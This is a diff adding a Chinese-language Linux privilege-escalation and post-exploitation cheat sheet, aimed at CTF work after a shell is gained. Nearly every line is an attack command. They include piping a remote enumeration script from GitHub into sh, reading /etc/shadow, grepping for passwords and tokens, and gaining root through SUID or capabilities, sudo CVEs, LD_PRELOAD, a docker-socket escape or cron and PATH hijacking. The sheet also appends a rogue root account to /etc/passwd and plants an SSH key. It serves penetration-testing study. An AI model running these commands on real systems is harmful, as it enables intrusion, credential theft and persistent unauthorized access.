@@ -1,0 +1,83 @@
+==========================================================================
+ Linux 提权 / 后渗透信息收集速查（CTF Pwn/Web getshell 后）
+ 仅用于授权测试与靶场
+==========================================================================
+
+【0x01 一键脚本】
+  linpeas:  curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
+  linenum:  ./LinEnum.sh -r report
+  linux-exploit-suggester:  ./les.sh
+  linux-smart-enumeration:  ./lse.sh -l2
+  无网环境: 提前下载上传；或用下面手工命令
+
+【0x02 基础信息】
+  id; sudo -l; cat /etc/passwd | grep -v nologin
+  uname -a; cat /etc/os-release; arch
+  hostname; ip a; ip route; ifconfig; cat /etc/hosts
+  env; set; pwd; mount; df -h; ls -la /
+  ps auxf; ps -ef --forest; ss -tulnp; netstat -tulnp
+  last; lastlog; w; who
+
+【0x03 SUID / SGID】
+  find / -perm -4000 -type f 2>/dev/null
+  find / -perm -u+s -type f -ls 2>/dev/null
+  getcap -r / 2>/dev/null          # capabilities
+  GTFOBins 查命令怎么利用: https://gtfobins.github.io/
+  常见: nmap --interactive、find -exec、vim、bash -p、cp、python/perl/ruby
+  capabilities:
+    cap_setuid:    python3 -c 'import os;os.setuid(0);os.system("/bin/sh")'
+    cap_dac_read:  直接读 /etc/shadow
+    perl/rub/tar 等在 GTFOBins 搜对应名
+
+【0x04 sudo】
+  sudo -l
+  (ALL) NOPASSWD: xxx -> GTFOBins 查
+  sudo -l 显示可执行: find/vim/man/awk/less/more/nmap/env/python/perl 等
+  利用环境变量: sudo LD_PRELOAD=/tmp/x.so <程序>
+  CVE: sudo 1.8.27 (CVE-2019-14287)  sudo -u#-1 /bin/bash
+       Baron Samedit CVE-2021-3156 (sudoedit)
+
+【0x05 计划任务/cron】
+  cat /etc/crontab; ls -la /etc/cron*; crontab -l
+  systemctl list-timers --all
+  找可写脚本/路径，等 root 执行；通配符注入(tar/chown/rsync 见 GTFO)
+  PATH 劫持: cron 脚本用相对路径调用命令，往可写目录放同名程序
+
+【0x06 内核漏洞】
+  uname -r 对照:
+    2.6.x  Dirty Cow CVE-2016-5195
+    <4.5.1  overlayfs CVE-2015-1328
+    4.4/4.8  DirtyPipe CVE-2022-0847 (>=5.8 特定版本)
+    <4.4 多种 mem_write/ptrace
+  searchsploit linux kernel <版本>
+  les.sh 自动给建议；注意内核提权常导致系统不稳定，先确认是靶机
+
+【0x07 配置/凭据】
+  cat /etc/shadow（可读就 john/hashcat）
+  grep -rE "password|passwd|pwd|secret|token" /var/www /home /opt /srv 2>/dev/null
+  find / -name "*.conf" -o -name "*.yml" -o -name "*.env" -o -name "id_rsa" 2>/dev/null
+  ls -la ~/.ssh; cat ~/.bash_history; cat /home/*/.bash_history
+  docker:  docker -H unix:///var/run/docker.sock run -v /:/host -it alpine chroot /host
+  数据库本地无密码: mysql -u root、psql、redis-cli
+  云主机: curl 元数据(见 ssrf_payloads.txt)拿临时 AK/SK
+
+【0x08 服务与组】
+  groups; id
+  docker/lxc/lxd 组: 挂载宿主机根
+  disk/shadow 组: 直接读块设备/shadow
+  adm: 读日志；sudo/admin/wheel: 多半可 sudo
+  内部服务: ss -tulnp 找只监听 127.0.0.1 的服务，SSH 隧道转发:
+    ssh -L 8080:127.0.0.1:8080 user@target
+
+【0x09 NFS / 文件系统】
+  showmount -e 127.0.0.1; cat /etc/exports
+  no_root_squash 共享: 本地 root 挂载后造 SUID root shell
+  可写 /etc/passwd: openssl passwd -1 -salt x p -> 追加 root2 行
+  WSL: /mnt/c 直接读 Windows 盘
+
+【0x10 拿 shell 后稳定化】
+  python3 -c 'import pty;pty.spawn("/bin/bash")'
+  Ctrl+Z -> stty raw -echo; fg -> reset -> export TERM=xterm
+  写 SSH key: mkdir ~/.ssh; echo 公钥 >> authorized_keys
+  反弹见 reverse_shell_gen.py
+==========================================================================
